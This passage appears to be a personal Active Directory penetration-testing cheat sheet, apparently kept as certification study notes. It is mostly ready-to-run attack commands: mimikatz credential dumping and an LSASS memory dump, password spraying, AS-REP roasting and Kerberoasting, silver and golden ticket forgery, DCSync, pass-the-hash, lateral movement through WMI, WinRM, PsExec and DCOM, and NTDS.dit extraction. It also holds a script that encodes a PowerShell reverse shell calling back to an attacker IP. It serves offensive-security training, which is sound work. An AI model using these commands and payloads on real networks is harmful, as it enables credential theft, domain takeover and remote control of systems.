"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
"DOMAIN\check_our_user_compromised"
```

```
//GenericAll Rights on Groups
net group "Management Department" check_our_user_compromised /add /domain
Get-NetGroup "Management Department" | select member

//GenericAll Rights on Users
net user <username> <password> /domain
```

### AD Enumeration - Enumerating Domain Shares

```
Find-DomainShare  -CheckShareAccess
```

```
SYSVOL: %SystemRoot%\SYSVOL\Sysvol\domain-name
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
kali> gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

### Automated Enumeration

```
powershell -ep bypass
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\user\Desktop\ -OutputPrefix "Myaudit"
```
```
sudo neo4j start
bloodhound
```

## Attacking Authentication

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

```
 .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 700 C:\Tools\lsass.dmp full
```


### Spray Passwords
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "juan", "MyP4ssw0rd")
```

```
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass MyP4ssw0rd -Admin
```

```
crackmapexec smb 192.168.50.75 -u users.txt -p 'MyP4ssw0rd' -d domain.com --continue-on-success
```

```powershell
.\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "MyP4ssw0rd"
```
```bash
./kerbrute_linux_amd64 passwordspray -d doamin.com --dc 192.168.158.70 /tmp/users.txt 'MyP4ssw0rd'
kerbrute -users users.txt -password 'MyP4ssw0rd' -domain domain.com -dc-ip 192.168.158.70
```

### AS-REP Roasting (User Valid AD)

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast domain.com/juan

getnpusers.py corp.com/ -dc-ip <ip> 
getnpusers.py corp.com/ -no-pass -usersfile users.txt -dc-ip <ip>

hashcat --help | grep -i "Kerberos"
hashcat -m 18200 hash.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```powershell
.\Rubeus.exe asreproast /nowrap
```

```powershell
//PowerView
Get-DomainUser -PreauthNotRequired

bloodyAD -u pete -p 'Nexus123!' -d corp.com --host 192.168.247.70 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName

Set-DomainObject -Identity robert -XOR @{useraccountcontrol=4194304} -Verbose
bloodyAD -u pete -p 'MyP4ssw0rd' -d domain.com --host 192.168.247.70 add uac -f DONT_REQ_PREAUTH juan
```
https://github.com/CravateRouge/bloodyAD/wiki


### Kerberoasting (User Valid AD)
https://www.thehacker.recipes/a-d/movement/dacl/targeted-kerberoasting

```poweshell
.\Rubeus.exe kerberoast /outfile:hash.kerberoast
```

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain.com/juan
impacket-GetUserSPNs -request -dc-ip 192.168.191.70 domain.com/juan:'MyP4ssw0rd'
```

```bash
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Silver Tickets (NTLM/service_spn, SID_user)

```
privilege::debug
sekurlsa::logonpasswords
...
Username : iis_service
NTLM     : 4d28cf5252d39971419580a51484ca09
```
```
whoami /user
domain\juan S-1-5-21-1987370270-658905905-1781884369-1105
```

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:domain.com /ptt /target:SPN.domain.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:juan

klist
iwr -UseDefaultCredentials http://spn | Select-Object -Expand Content
kerberos::purge
```

### Domain Controller Synchronization

To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights.

```powershell
.\mimikatz.exe
lsadump::dcsync /user:domain\juan
lsadump::dcsync /user:domain\Administrator

hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```bash
impacket-secretsdump -just-dc-user juan domain.com/juanadmin:"MyP3ssw0rd"@192.168.50.70
```

## Lateral Movement

```powershell
wmic /node:192.168.50.73 /user:juan /password:MyP4ssw0rd! process call create "calc"
```

```powershell
$username = 'juan';
$password = 'MyP4ssw0rd!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

.\encode.py
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```

```
C:\>winrs -r:client01 -u:juan -p:MyP4ssw0rd!  "cmd /c hostname & whoami"
C:\>winrs -r:client01 -u:juan -p:MyP4ssw0rd!  "powershell -nop -w hidden -e JABjAGwA...
nc -lnvp 443
```

```powershell
$username = 'juan';
$password = 'MyP4ssw0rd!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
whoami
hostname

$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc=Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name }

Invoke-Command -ComputerName client01.domain.com -ScriptBlock {whoami;hostname}
```

### PsExec

```powershell
./PsExec64.exe -i  \\CLIENT04 -u domain\juan -p MyP4ssw0rd! cmd
```

### Pass the Hash

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.191.72

pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
eb3b9f05c425e //10.11.0.22 cmd
```


### Overpass the Hash (NTLM_USER)
```
privilege::debug
sekurlsa::logonpasswords
...
Username : juan
NTLM     : 369def79d8372408bf6e93364cc93075
...
sekurlsa::pth /user:juan /domain:domain.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

net use \\client01
klist
```

```
.\PsExec.exe \\files04 cmd
whoami
hostname
```

### Pass the Ticket (kirbi)

```
privilege::debug
sekurlsa::tickets /export
```

```
dir *.kirbi
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
ls \\hostname\backup

.\PsExec.exe \\hostname cmd
Note: It doesn't work because one ticket is for one service
```

### DCOM

```powershell
$dcom=[System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","1.1.5.7"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAG...","7")
```

### Golden Ticket

```
privilege::debug
lsadump::lsa /patch
...
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
User : krbtgt
NTLM : 1693c6cefafffc7af11ef34d1c788f47

kerberos::purge
```

```
kerberos::golden /user:juan /domain:domain.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
misc::cmd
```

```
PsExec.exe \\dc1 cmd.exe
ipconfig
whoami
domain\juan

psexec.exe \\192.168.50.70 cmd.exe
Note: It doesn't work because with IP use NTLM
```

### Shadow Copies

```
vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```


## Group Backup Operator Privilege Escalation
https://www.bordergate.co.uk/backup-operator-privilege-escalation/
https://github.com/horizon3ai/backup_dc_registry/tree/main?ref=content.kayssel.com
https://github.com/horizon3ai/backup_dc_registry






# Tips
### iptables
1. Crear regla para trafico de entrada y salida 
```
iptables -I INPUT 1 -s <IP> -j ACCEPT
iptables -I OUTPUT 1 -d <IP> -j ACCEPT
-I: insertar nueva regla
-s: source address
-d: destination address
-j: aceptar el tráfico 
```
2. Establecer contador de paquetes en Zero
```
iptables -Z
```
3. Listar  las reglas presentes
```
iptables -vn -L
```

### PowerShell

Runas
```
powershell -ep bypass -C "Start-Process cmd -Verb RunAs"
```

```
Test-NetConnection -Port <n> <IP>
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<IP>", $_)) "TCP port $_ is open"} 2>$null
```

### Windows Install feactures
```
dism /online /Enable-Feature /FeatureName:TelnetClient
```

### XfreeRDP

```
xfreerdp +clipboard /u:user /d:domain.com /v:192.168.185.75 /drive:/tmp,share_oscp
freerdp +clipboard /u:juan /p:'mypass!!' /d:domain.com /v:192.168.185.75
```

XFREERDP PTH
```
crackmapexec smb 192.168.207.76 -u "juan" -H "369def79d8372408bf6e93364cc93075" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

xfreerdp /cert-ignore +clipboard /u:juan /pth:369def79d8372408bf6e93364cc93075 /v:192.168.207.76 /drive:/tmp,share_oscp 
```
